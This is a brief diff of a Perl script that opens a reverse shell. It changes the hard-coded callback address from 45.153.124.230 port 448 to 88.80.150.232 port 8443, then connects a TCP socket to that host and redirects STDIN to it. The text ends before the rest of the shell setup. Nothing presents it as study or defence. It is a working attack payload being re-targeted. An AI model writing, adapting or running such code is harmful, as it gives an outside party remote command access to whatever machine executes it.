@@ -1,6 +1,6 @@
 use Socket; 
-$i="45.153.124.230"; 
-$p=448; 
+$i="88.80.150.232"; 
+$p=8443; 
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); 
 if(connect(S,sockaddr_in($p,inet_aton($i)))){ 
 	open(STDIN,">&S"); 
